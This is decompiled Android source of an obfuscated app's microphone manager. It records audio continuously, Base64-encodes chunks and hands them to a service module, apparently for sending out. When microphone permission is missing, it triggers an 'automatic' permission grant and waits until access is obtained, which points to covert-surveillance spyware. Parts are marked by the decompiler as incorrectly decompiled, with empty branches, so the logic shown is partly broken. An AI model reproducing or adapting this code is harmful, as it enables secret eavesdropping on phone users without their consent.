package com.storm.safe.rock.manager;

import android.media.AudioRecord;
import android.media.audiofx.AcousticEchoCanceler;
import android.media.audiofx.NoiseSuppressor;
import android.util.Base64;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.ShortBuffer;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlinx.coroutines.AbstractC0780a0;
import p000.AbstractC1117qo;
import p000.AbstractC1262tj;
import p000.C0873ms;
import p000.C1351vv;
import p000.ExecutorC1158qw;
import p000.b81;
import p000.bg0;
import p000.kg1;
import p000.t60;
import p000.u11;
import p000.y21;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.manager.a1 */
/* loaded from: classes2.dex */
public final class C0259a1 {

    /* renamed from: a0 */
    public final dqtvuisjd f52094a0;

    /* renamed from: a1 */
    public final dqtvuisjd f52095a1;

    /* renamed from: a2 */
    public AudioRecord f52096a2;

    /* renamed from: a3 */
    public final AtomicBoolean f52097a3 = new AtomicBoolean(false);

    /* renamed from: a4 */
    public u11 f52098a4;

    /* renamed from: a5 */
    public final C0873ms f52099a5;

    /* renamed from: a6 */
    public final AtomicLong f52100a6;

    /* renamed from: a7 */
    public AcousticEchoCanceler f52101a7;

    /* renamed from: a8 */
    public NoiseSuppressor f52102a8;

    /* renamed from: a9 */
    public MicrophoneManager$QualityMode f52103a9;

    /* renamed from: b0 */
    public MicrophoneManager$AudioSource f52104b0;

    /* renamed from: b1 */
    public float f52105b1;

    /* renamed from: b2 */
    public boolean f52106b2;

    static {
        new bg0(null);
    }

    public C0259a1(dqtvuisjd dqtvuisjdVar) {
        this.f52094a0 = dqtvuisjdVar;
        this.f52095a1 = dqtvuisjdVar;
        ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
        y21 y21Var = new y21();
        executorC1158qw.getClass();
        this.f52099a5 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(executorC1158qw, y21Var));
        this.f52100a6 = new AtomicLong(0L);
        this.f52103a9 = MicrophoneManager$QualityMode.STANDARD;
        this.f52104b0 = MicrophoneManager$AudioSource.VOICE_RECOGNITION;
        this.f52105b1 = 1.0f;
        this.f52106b2 = true;
    }

    /* JADX WARN: Can't wrap try/catch for region: R(7:52|(1:100)|53|96|57|(1:59)|63) */
    /* JADX WARN: Code restructure failed: missing block: B:61:0x00fc, code lost:
    
        r0 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:62:0x00fd, code lost:
    
        p000.t60.m214705c6("MicrophoneManager", "发送音频数据失败", r0);
     */
    /* JADX WARN: Removed duplicated region for block: B:31:0x009b  */
    /* JADX WARN: Removed duplicated region for block: B:76:0x0161 A[Catch: Exception -> 0x0165, PHI: r0
      0x0161: PHI (r0v12 android.media.AudioRecord) = (r0v10 android.media.AudioRecord), (r0v14 android.media.AudioRecord) binds: [B:82:0x0171, B:75:0x015f] A[DONT_GENERATE, DONT_INLINE], TRY_LEAVE, TryCatch #7 {Exception -> 0x0165, blocks: (B:74:0x015d, B:76:0x0161, B:81:0x016f), top: B:95:0x0027 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:69:0x0139 -> B:70:0x0142). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:71:0x0149 -> B:72:0x0153). Please report as a decompilation issue!!! */
    /* renamed from: a0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m211251a0(C0259a1 c0259a1, ContinuationImpl continuationImpl) throws Throwable {
        MicrophoneManager$recordAudio$1 microphoneManager$recordAudio$1;
        Throwable th;
        int i;
        int i2;
        byte[] bArr;
        int i3;
        int i4;
        int i5;
        int i6;
        byte[] bArr2;
        long jNanoTime;
        long j;
        Exception e;
        AudioRecord audioRecord;
        long j2;
        String strEncodeToString;
        C0259a1 c0259a12 = c0259a1;
        if (continuationImpl instanceof MicrophoneManager$recordAudio$1) {
            microphoneManager$recordAudio$1 = (MicrophoneManager$recordAudio$1) continuationImpl;
            int i7 = microphoneManager$recordAudio$1.f52008b1;
            if ((i7 & Integer.MIN_VALUE) != 0) {
                microphoneManager$recordAudio$1.f52008b1 = i7 - Integer.MIN_VALUE;
            } else {
                microphoneManager$recordAudio$1 = new MicrophoneManager$recordAudio$1(c0259a12, continuationImpl);
            }
        }
        Object obj = microphoneManager$recordAudio$1.f52006a9;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i8 = microphoneManager$recordAudio$1.f52008b1;
        try {
            try {
            } catch (Throwable th2) {
                th = th2;
            }
        } catch (Exception e2) {
            t60.m214705c6("MicrophoneManager", "停止AudioRecord失败", e2);
        }
        if (i8 == 0) {
            i = 1;
            kg1.m213544f4(obj);
            int i9 = c0259a12.f52103a9.f51996a0;
            i2 = (i9 * 40) / 1000;
            int i10 = i2 * 5;
            byte[] bArr3 = new byte[i2];
            byte[] bArr4 = new byte[i10];
            try {
                AudioRecord audioRecord2 = c0259a12.f52096a2;
                if (audioRecord2 != null) {
                    audioRecord2.startRecording();
                }
                bArr = bArr3;
                i3 = 0;
                i4 = i9;
                i5 = 0;
                i6 = i10;
                bArr2 = bArr4;
                jNanoTime = System.nanoTime();
                j = 20000000;
                if (c0259a12.f52097a3.get()) {
                }
                audioRecord = c0259a12.f52096a2;
                if (audioRecord != null) {
                }
            } catch (Exception e3) {
                e = e3;
                t60.m214705c6("MicrophoneManager", "录音过程中发生错误", e);
                audioRecord = c0259a12.f52096a2;
                if (audioRecord != null) {
                }
                return C1351vv.f60710b1;
            }
            return C1351vv.f60710b1;
        }
        if (i8 != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        j = microphoneManager$recordAudio$1.f52005a8;
        int i11 = microphoneManager$recordAudio$1.f52004a7;
        int i12 = microphoneManager$recordAudio$1.f52003a6;
        i6 = microphoneManager$recordAudio$1.f52002a5;
        int i13 = microphoneManager$recordAudio$1.f52001a4;
        int i14 = microphoneManager$recordAudio$1.f52000a3;
        bArr2 = microphoneManager$recordAudio$1.f51999a2;
        bArr = microphoneManager$recordAudio$1.f51998a1;
        C0259a1 c0259a13 = microphoneManager$recordAudio$1.f51997a0;
        try {
            kg1.m213544f4(obj);
            int i15 = i14;
            int i16 = 1;
            i3 = i11;
            c0259a12 = c0259a13;
            i4 = i15;
            i5 = i12;
            i2 = i13;
            i = i16;
            jNanoTime = System.nanoTime();
            if (c0259a12.f52097a3.get()) {
                int i17 = 0;
                while (true) {
                    if (i17 >= i2) {
                        j2 = jNanoTime;
                        break;
                    }
                    j2 = jNanoTime;
                    if (!c0259a12.f52097a3.get()) {
                        break;
                    }
                    AudioRecord audioRecord3 = c0259a12.f52096a2;
                    int i18 = audioRecord3 != null ? audioRecord3.read(bArr, i17, i2 - i17) : 0;
                    if (i18 > 0) {
                        i17 += i18;
                    }
                    jNanoTime = j2;
                }
                if (c0259a12.f52097a3.get()) {
                    if (c0259a12.f52105b1 != 1.0f) {
                        c0259a12.m211252a1(bArr);
                    }
                    System.arraycopy(bArr, 0, bArr2, i5, i2);
                    i5 += i2;
                    int i19 = i3 + 1;
                    if (i19 >= 5) {
                        try {
                        } catch (Exception e4) {
                            t60.m214705c6("MicrophoneManager", "音频编码失败", e4);
                            strEncodeToString = "";
                        }
                        strEncodeToString = Base64.encodeToString(bArr2, 2);
                        t60.m214694b5(strEncodeToString, "{\n            android.ut…Base64.NO_WRAP)\n        }");
                        C0323a8 c0323a8M211471g5 = c0259a12.f52094a0.m211471g5();
                        if (c0323a8M211471g5 != null) {
                            c0323a8M211471g5.m211660c6(i4, i6 / 2, strEncodeToString);
                        }
                        i5 = 0;
                        i19 = 0;
                    }
                    long jNanoTime2 = System.nanoTime() - j2;
                    if (jNanoTime2 < j) {
                        long j3 = j;
                        microphoneManager$recordAudio$1.f51997a0 = c0259a12;
                        microphoneManager$recordAudio$1.f51998a1 = bArr;
                        microphoneManager$recordAudio$1.f51999a2 = bArr2;
                        microphoneManager$recordAudio$1.f52000a3 = i4;
                        microphoneManager$recordAudio$1.f52001a4 = i2;
                        microphoneManager$recordAudio$1.f52002a5 = i6;
                        microphoneManager$recordAudio$1.f52003a6 = i5;
                        microphoneManager$recordAudio$1.f52004a7 = i19;
                        int i20 = i6;
                        microphoneManager$recordAudio$1.f52005a8 = j3;
                        i16 = i;
                        microphoneManager$recordAudio$1.f52008b1 = i16;
                        if (b81.m210571b1((j - jNanoTime2) / 1000000, microphoneManager$recordAudio$1) == coroutineSingletons) {
                            return coroutineSingletons;
                        }
                        int i21 = i2;
                        i12 = i5;
                        i15 = i4;
                        c0259a13 = c0259a12;
                        i11 = i19;
                        i13 = i21;
                        j = j3;
                        i6 = i20;
                        i3 = i11;
                        c0259a12 = c0259a13;
                        i4 = i15;
                        i5 = i12;
                        i2 = i13;
                        i = i16;
                        jNanoTime = System.nanoTime();
                        if (c0259a12.f52097a3.get()) {
                        }
                    } else {
                        i16 = i;
                        j = j;
                        i3 = i19;
                        i6 = i6;
                        i = i16;
                        jNanoTime = System.nanoTime();
                        if (c0259a12.f52097a3.get()) {
                        }
                    }
                }
            }
            audioRecord = c0259a12.f52096a2;
        } catch (Exception e5) {
            e = e5;
            c0259a12 = c0259a13;
            t60.m214705c6("MicrophoneManager", "录音过程中发生错误", e);
            audioRecord = c0259a12.f52096a2;
            if (audioRecord != null) {
            }
            return C1351vv.f60710b1;
        } catch (Throwable th3) {
            th = th3;
            c0259a12 = c0259a13;
            try {
                AudioRecord audioRecord4 = c0259a12.f52096a2;
                if (audioRecord4 == null) {
                    throw th;
                }
                audioRecord4.stop();
                throw th;
            } catch (Exception e6) {
                t60.m214705c6("MicrophoneManager", "停止AudioRecord失败", e6);
                throw th;
            }
        }
        if (audioRecord != null) {
            audioRecord.stop();
        }
        return C1351vv.f60710b1;
    }

    /* renamed from: a1 */
    public final void m211252a1(byte[] bArr) {
        ShortBuffer shortBufferAsShortBuffer = ByteBuffer.wrap(bArr).order(ByteOrder.LITTLE_ENDIAN).asShortBuffer();
        int iRemaining = shortBufferAsShortBuffer.remaining();
        short[] sArr = new short[iRemaining];
        shortBufferAsShortBuffer.get(sArr);
        for (int i = 0; i < iRemaining; i++) {
            sArr[i] = (short) AbstractC1117qo.m214413a9((int) (sArr[i] * this.f52105b1), -32768, 32767);
        }
        ByteBuffer.wrap(bArr).order(ByteOrder.LITTLE_ENDIAN).asShortBuffer().put(sArr);
    }

    /* renamed from: a2 */
    public final boolean m211253a2() {
        try {
            return this.f52095a1.checkSelfPermission("android.permission.RECORD_AUDIO") == 0;
        } catch (Exception e) {
            t60.m214705c6("MicrophoneManager", "检查麦克风权限失败", e);
            return false;
        }
    }

    /* renamed from: a3 */
    public final void m211254a3(MicrophoneManager$AudioSource microphoneManager$AudioSource) {
        if (this.f52097a3.get()) {
            t60.m214726f4("MicrophoneManager", "⚠️ 录音中无法更改音频来源，请先停止录音");
            return;
        }
        this.f52104b0 = microphoneManager$AudioSource;
        t60.m214714d6("MicrophoneManager", "🎤 音频来源设置为: " + microphoneManager$AudioSource.f51991a1 + "(" + microphoneManager$AudioSource.f51990a0 + ")");
    }

    /* renamed from: a4 */
    public final void m211255a4() throws IllegalStateException, InterruptedException {
        C0260a2 c0260a2;
        AtomicBoolean atomicBoolean = this.f52097a3;
        if (atomicBoolean.get()) {
            t60.m214726f4("MicrophoneManager", "🎤 录音已在进行中");
            return;
        }
        if (!m211253a2()) {
            t60.m214726f4("MicrophoneManager", "⚠️ 麦克风权限未授予，尝试自动申请");
            try {
                dqtvuisjd dqtvuisjdVar = this.f52094a0;
                try {
                    t60.m214714d6("dqtvuisjd", "🎤 申请麦克风权限（自动授权）");
                    c0260a2 = dqtvuisjdVar.f52369a0;
                } catch (Exception e) {
                    t60.m214705c6("dqtvuisjd", "申请麦克风权限失败", e);
                }
            } catch (Exception e2) {
                t60.m214705c6("MicrophoneManager", "触发麦克风权限申请失败", e2);
            }
            if (c0260a2 == null) {
                t60.m214724f2("permissionGranter");
                throw null;
            }
            c0260a2.m211327h0();
            for (int i = 0; i < 16; i++) {
                try {
                    Thread.sleep(500L);
                } catch (InterruptedException unused) {
                }
                if (m211253a2()) {
                    break;
                }
            }
            if (!m211253a2()) {
                t60.m214726f4("MicrophoneManager", "⚠️ 等待后仍未获得麦克风权限，取消录音启动");
                return;
            }
        }
        try {
            int i2 = this.f52103a9.f51996a0;
            int minBufferSize = AudioRecord.getMinBufferSize(i2, 16, 2);
            int i3 = ((i2 * 40) / 1000) * 8;
            if (i3 < minBufferSize) {
                i3 = minBufferSize;
            }
            AudioRecord audioRecord = new AudioRecord(this.f52104b0.f51990a0, i2, 16, 2, (((i3 + minBufferSize) - 1) / minBufferSize) * minBufferSize);
            this.f52096a2 = audioRecord;
            if (audioRecord.getState() != 1) {
                t60.m214704c5("MicrophoneManager", "❌ AudioRecord初始化失败");
                return;
            }
            try {
                AudioRecord audioRecord2 = this.f52096a2;
                int audioSessionId = audioRecord2 != null ? audioRecord2.getAudioSessionId() : 0;
                if (audioSessionId > 0) {
                    if (NoiseSuppressor.isAvailable()) {
                        NoiseSuppressor noiseSuppressorCreate = NoiseSuppressor.create(audioSessionId);
                        this.f52102a8 = noiseSuppressorCreate;
                        if (noiseSuppressorCreate != null) {
                            noiseSuppressorCreate.setEnabled(this.f52106b2);
                        }
                    }
                    if (AcousticEchoCanceler.isAvailable()) {
                        AcousticEchoCanceler acousticEchoCancelerCreate = AcousticEchoCanceler.create(audioSessionId);
                        this.f52101a7 = acousticEchoCancelerCreate;
                        if (acousticEchoCancelerCreate != null) {
                            acousticEchoCancelerCreate.setEnabled(true);
                        }
                    }
                }
            } catch (Exception unused2) {
            }
            atomicBoolean.set(true);
            this.f52100a6.set(0L);
            this.f52098a4 = AbstractC0780a0.m213692a3(this.f52099a5, null, new MicrophoneManager$startRecording$1(this, null), 3);
        } catch (Exception e3) {
            t60.m214705c6("MicrophoneManager", "启动录音失败", e3);
            atomicBoolean.set(false);
        }
    }

    /* renamed from: a5 */
    public final void m211256a5() {
        AtomicBoolean atomicBoolean = this.f52097a3;
        if (!atomicBoolean.get()) {
            t60.m214726f4("MicrophoneManager", "🎤 录音未在进行中");
            return;
        }
        try {
            atomicBoolean.set(false);
            u11 u11Var = this.f52098a4;
            if (u11Var != null) {
                u11Var.m215253a7(null);
            }
            AudioRecord audioRecord = this.f52096a2;
            if (audioRecord != null) {
                audioRecord.stop();
            }
            AudioRecord audioRecord2 = this.f52096a2;
            if (audioRecord2 != null) {
                audioRecord2.release();
            }
            this.f52096a2 = null;
            try {
                NoiseSuppressor noiseSuppressor = this.f52102a8;
                if (noiseSuppressor != null) {
                    noiseSuppressor.setEnabled(false);
                }
                NoiseSuppressor noiseSuppressor2 = this.f52102a8;
                if (noiseSuppressor2 != null) {
                    noiseSuppressor2.release();
                }
                this.f52102a8 = null;
                AcousticEchoCanceler acousticEchoCanceler = this.f52101a7;
                if (acousticEchoCanceler != null) {
                    acousticEchoCanceler.setEnabled(false);
                }
                AcousticEchoCanceler acousticEchoCanceler2 = this.f52101a7;
                if (acousticEchoCanceler2 != null) {
                    acousticEchoCanceler2.release();
                }
                this.f52101a7 = null;
            } catch (Exception unused) {
            }
        } catch (Exception e) {
            t60.m214705c6("MicrophoneManager", "停止录音失败", e);
        }
    }
}
